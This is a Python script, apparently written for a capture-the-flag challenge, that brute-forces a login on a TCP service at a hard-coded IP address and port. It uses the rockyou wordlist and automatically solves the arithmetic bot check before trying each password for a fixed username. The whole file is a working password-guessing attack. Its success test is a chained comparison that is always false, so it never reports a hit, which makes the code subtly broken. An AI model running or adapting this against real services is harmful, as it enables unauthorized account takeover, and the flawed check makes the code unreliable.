import socket
import re
import operator


host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/Users/dokidokicrisis/wordlist/rockyou.txt" # Point to wordlist file

def brute_force():
	file = open(wordlist,"r")
	username = "ejnorman84"
	regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
	ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
	counter = 0

	for pw in file:
		print("Attampt #" + str(counter) + " Trying Passowrd: " + pw)
		counter += 1
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))

		d1 = s.recv(1024)

		while re.search(regex,d1) == None:
			d1 = s.recv(1024)

		print("======data=====")
		print("|"+d1+"|")
		print("======end=====")

		m = re.search(regex,d1)
		firstNum = int(m.group('firstNum'))
		secNum = int(m.group('secNum'))
		op = m.group('op')
		res = str(ops[op](firstNum,secNum))
		print("answr is " + res)
		s.send(res+"\n")
		d2 = s.recv(1024)
		while d2 == "\n":
			d2 = s.recv(1024)
		print("d2 is " + d2)

		s.send(username + "\n")
		d3 = s.recv(1024)
		while d3 == "\n":
			d3 = s.recv(1024)
		print("d3 is " + d3)

		s.send(pw + "\n")
		d4 = s.recv(1024)
		while d4 == "\n":
			d4 = s.recv(1024)

		print("d4 result is " + d4)
		if "Fail" in d4 == False:
			print("SUCCESS")
			print("PASSWORD: " + pw)
			return



		s.close()
		print("++++s closed++++")

if __name__ == '__main__':
	brute_force()
